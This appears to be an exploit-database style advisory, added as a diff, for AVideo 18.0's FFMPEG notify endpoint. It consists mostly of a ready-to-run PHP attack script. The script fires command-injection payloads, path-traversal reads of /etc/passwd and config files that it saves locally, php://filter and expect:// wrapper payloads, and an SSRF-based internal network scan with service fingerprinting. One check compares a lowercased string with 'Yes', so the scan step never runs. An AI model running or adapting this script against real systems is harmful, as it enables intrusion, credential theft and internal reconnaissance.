@@ -1,0 +1,268 @@
+=============================================================================================================================================
+| # Title     : AVideo 18.0 via notify.ffmpeg.json.php Server-Side Misconfigurations                                                        |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://github.com/WWBN/AVideo                                                                                              |
+=============================================================================================================================================
+
+[+] References : 
+
+[+] Summary    : This PHP script defines a command-line tool that simulates an advanced security testing workflow against a target web application. 
+                 It programmatically sends crafted HTTP requests to analyze server behavior and identify potential vulnerabilities. The tool includes modules to:
+                 Analyze weak or predictable encryption behavior by observing responses to controlled inputs.
+                 Test for command injection by submitting various payload patterns and checking responses for execution indicators.
+                 Probe for local file inclusion (LFI) and unsafe stream wrappers, with optional base64 decoding of returned data.
+                 Attempt unauthorized file access via path traversal–style inputs.
+                 Perform basic SSRF-based internal service discovery and rudimentary service fingerprinting on common ports.
+                 Overall, the script is structured as a modular proof-of-concept scanner intended to evaluate how a backend handles untrusted parameters, error handling, and network exposure. 
+				 It is designed for controlled, authorized security testing and research purposes only.
+
+[+] PoC : php exploit.php http://target.com/plugin/FFMPEG/notify.php
+
+<?php
+
+class AdvancedExploit {
+    private $target;
+    private $encryptionKey = null;
+    
+    public function __construct($targetUrl) {
+        $this->target = $targetUrl;
+    }
+
+    public function analyzeEncryption() {
+        echo "[*] Analysis of the encryption algorithm...\n";
+
+        $tests = [
+            'test' => 'test',
+            '123' => '123',
+            'callback=http://test.com' => 'callback=http://test.com'
+        ];
+        
+        foreach ($tests as $plain => $expected) {
+            $encrypted = $this->makeRequest(['notifyCode' => $plain]);
+            
+            if ($encrypted) {
+                echo "  [+] '$plain' => A response containing: " . substr($encrypted, 0, 50) . "\n";
+            }
+        }
+    }
+
+    public function testCommandInjection() {
+        echo "[*] Command injection test...\n";
+        
+        $payloads = [
+            '"; ls -la; echo "',
+            '`id`',
+            '$(whoami)',
+            '|| ping -c 5 127.0.0.1',
+            '; cat /etc/passwd; #',
+            '${IFS}etc${IFS}passwd'
+        ];
+        
+        foreach ($payloads as $payload) {
+            $notify = json_encode([
+                'file' => 'test.mp4',
+                'command' => 'ffmpeg -i input.mp4 ' . $payload
+            ]);
+            
+            $response = $this->makeRequest([
+                'notifyCode' => 'test',
+                'notify' => $notify
+            ]);
+            
+            if ($response && $this->containsOutput($response, ['root:', 'uid=', 'bin/bash'])) {
+                echo "[!] Successful injection of commands with payload: $payload\n";
+                return true;
+            }
+        }
+        
+        return false;
+    }
+
+    public function testFileUpload() {
+        echo "[*] File loading test...\n";
+        
+        $paths = [
+            '../../../../etc/passwd',
+            '/var/www/html/config.php',
+            '/var/www/html/videos/configuration.php',
+            '../../../wp-config.php'
+        ];
+        
+        foreach ($paths as $path) {
+            $notify = json_encode([
+                'file' => $path,
+                'process' => true
+            ]);
+            
+            $response = $this->makeRequest([
+                'notifyCode' => 'test',
+                'notify' => $notify
+            ]);
+            
+            if ($response && $this->containsOutput($response, ['<?php', 'mysql_connect', 'password'])) {
+                echo "[!] Accessed: $path\n";
+                file_put_contents('found_' . basename($path), $response);
+            }
+        }
+    }
+
+    public function testLFI() {
+        echo "[*] Local file embed testing...\n";
+        
+        $payloads = [
+            'php://filter/convert.base64-encode/resource=/etc/passwd',
+            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+',
+            'expect://id'
+        ];
+        
+        foreach ($payloads as $payload) {
+            $notify = json_encode([
+                'callback' => $payload
+            ]);
+            
+            $response = $this->makeRequest([
+                'notifyCode' => 'test',
+                'notify' => $notify,
+                'callback' => $payload
+            ]);
+            
+            if ($response) {
+                echo "[+] In response to $payload: " . substr($response, 0, 100) . "\n";
+                
+                if (strpos($payload, 'base64-encode') !== false) {
+                    $matches = [];
+                    if (preg_match('/callbackResult["\']:\s*["\']([^"\']+)/', $response, $matches)) {
+                        $decoded = base64_decode($matches[1]);
+                        echo "[*] المحتوى المفكوك: " . substr($decoded, 0, 200) . "\n";
+                    }
+                }
+            }
+        }
+    }
+
+    public function internalNetworkScan($subnet = '192.168.1') {
+        echo "[*] Scan the internal network: $subnet.0/24\n";
+        
+        $discovered = [];
+        
+        for ($i = 1; $i < 255; $i++) {
+            $ip = "$subnet.$i";
+
+            $ports = [80, 443, 8080, 22, 21];
+            
+            foreach ($ports as $port) {
+                $url = "http://$ip:$port";
+                $response = $this->testSSRF($url);
+                
+                if ($response !== false) {
+                    echo "[+] Found: $ip:$port\n";
+                    $discovered[] = "$ip:$port";
+                    
+                    $this->fingerprintService($ip, $port);
+                }
+            }
+            
+            if ($i % 10 == 0) {
+                echo "  progress: $i/254\n";
+            }
+        }
+        
+        return $discovered;
+    }
+    
+    private function makeRequest($params) {
+        $url = $this->target . '?' . http_build_query($params);
+        
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => 10,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (Exploit Scanner)'
+        ]);
+        
+        $response = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        
+        return ($httpCode == 200) ? $response : false;
+    }
+    
+    private function testSSRF($internalUrl) {
+        $params = [
+            'notifyCode' => base64_encode('test'),
+            'notify' => json_encode(['test' => true]),
+            'callback' => base64_encode($internalUrl)
+        ];
+        
+        return $this->makeRequest($params);
+    }
+    
+    private function containsOutput($response, $patterns) {
+        foreach ($patterns as $pattern) {
+            if (stripos($response, $pattern) !== false) {
+                return true;
+            }
+        }
+        return false;
+    }
+    
+    private function fingerprintService($ip, $port) {
+        $urls = [
+            "http://$ip:$port/robots.txt",
+            "http://$ip:$port/phpinfo.php",
+            "http://$ip:$port/admin/",
+            "http://$ip:$port/wp-admin/"
+        ];
+        
+        foreach ($urls as $testUrl) {
+            $response = $this->testSSRF($testUrl);
+            if ($response) {
+                echo "    - $testUrl => existing\n";
+            }
+        }
+    }
+    
+    public function fullExploit() {
+        echo "AVideo Advanced Exploitation Tool by indoushka\n";
+        echo "===============================================\n\n";
+        
+        $this->analyzeEncryption();
+        
+        if ($this->testCommandInjection()) {
+            echo "[!] The system is vulnerable to hacking via command injection.\n";
+        }
+        
+        $this->testLFI();
+        
+        $this->testFileUpload();
+        
+        echo "\n[*] Do you want to scan the internal network? (Yes/No): ";
+        $handle = fopen("php://stdin", "r");
+        $line = fgets($handle);
+        
+        if (trim(strtolower($line)) == 'Yes') {
+            $this->internalNetworkScan();
+        }
+    }
+}
+
+if (php_sapi_name() === 'cli') {
+    if ($argc < 2) {
+        echo "Usage: php advanced_exploit.php <target_url>\n";
+        exit(1);
+    }
+    
+    $exploit = new AdvancedExploit($argv[1]);
+    $exploit->fullExploit();
+}
+?>
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
